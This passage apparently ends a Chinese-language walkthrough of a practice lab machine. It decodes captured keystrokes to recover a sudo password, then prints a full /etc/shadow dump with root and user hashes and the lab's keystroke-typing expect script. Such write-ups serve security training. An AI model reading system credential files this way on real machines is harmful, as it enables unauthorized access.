+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">for</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> i </span><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">in</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> data:</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">    try</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">:</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        msg </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> bytes</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">fromhex</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(i)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        msg </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> msg.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\x00</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">).</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\x01</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        msg </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> msg.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\x1b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">).</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\x06</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        msg </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> msg.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\x08</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">).</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\x90</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        msg </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> msg.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\xb9</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">).</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\xa5</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        msg </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> msg.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\xac</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">).</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\x03</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        msg </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> msg.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\xe0</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">).</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">replace</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\xfd</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">''</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(msg)</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">    except</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">:</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'[-]'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span></code></pre>
+<p><img alt="image-20241112183156047.png" loading="lazy" decoding="async" width="363" height="501" src="/_astro/image-20241112183156047.BUqDTjKP_Z2e3kav.webp" srcset=""></p>
+<p>这里部分行的第一位是有字母的，怀疑和密码有关，把第一位是 <code>[</code> 的行过滤掉</p>
+<p><img alt="image-20241112184203008.png" loading="lazy" decoding="async" width="967" height="94" src="/_astro/image-20241112184203008.yDZnaziC_Z2iIws0.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>python3 1.py | awk -F "'" '{print $2}' | cut -c 1,2 | tr -d '[?\n '</span></span></code></pre>
+<p>从 <code>bbaacckkuupp..sshh</code> 来看，应该是写入到文件 <code>backup.sh</code>，那么上面的 <code>QQ33EEddddttddww33ppMMBB</code> 大概是密码的双写了，去重之后为 <code>Q3Eddtdw3pMB</code></p>
+<p><img alt="image-20241112184258652.png" loading="lazy" decoding="async" width="768" height="725" src="/_astro/image-20241112184258652.6E5dPMo-_Z21t8YI.webp" srcset=""></p>
+<h2 id="more">More</h2>
+<p>打这个靶机如果熟悉 Bolazr 的话，可以快速想到 5000 端口，以及其默认路径，我这里不太了解，只能通过 Top 1000 去扫描。不过这是一个通用的方法，毕竟，谁能把所有框架全部记住呢？</p>
+<h3 id="dump-hash">Dump Hash</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>root:$y$j9T$AIkP6DcupUzzLuD19q8Ea.$yfGWAj50b/chhcl4fuZL3jkIlp2NrkL63C5TXcDumJ0:19718:0:99999:7:::</span></span>
+<span class="line"><span>daemon:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>bin:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>sys:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>sync:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>games:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>man:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>lp:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>mail:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>news:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>uucp:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>proxy:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>www-data:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>backup:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>list:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>irc:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>gnats:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>nobody:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>_apt:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>systemd-network:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>systemd-resolve:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>messagebus:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>systemd-timesync:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>pollinate:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>sshd:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>syslog:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>uuidd:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>tcpdump:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>tss:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>landscape:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>fwupd-refresh:*:19579:0:99999:7:::</span></span>
+<span class="line"><span>usbmux:*:19715:0:99999:7:::</span></span>
+<span class="line"><span>tomas:$y$j9T$iBupKrKnYvDsG24KvgKi61$P9qTNx7BdVbyqWp5homuabzMA/vr.h3fds5VYDeMII3:19718:0:99999:7:::</span></span>
+<span class="line"><span>lxd:!:19715::::::</span></span>
+<span class="line"><span>_laurel:!:19936::::::</span></span></code></pre>
+<h3 id="botexp">bot.exp</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>#!/usr/bin/expect -f</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>spawn nano /root/automation.sh</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>set text "echo Q3Eddtdw3pMB | sudo ./backup.sh"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>while {1} {</span></span>
+<span class="line"><span>    foreach char [split $text ""] {</span></span>
+<span class="line"><span>        send "$char"</span></span>
+<span class="line"><span>        sleep 1</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    send "\r"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    sleep 0.5</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    for {set i 0} {$i &lt; [string length $text]} {incr i} {</span></span>
+<span class="line"><span>        send "\b \b"  ;</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    send "\r"</span></span>
+<span class="line"><span>}</span></span></code></pre>
+</div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer></body></html>
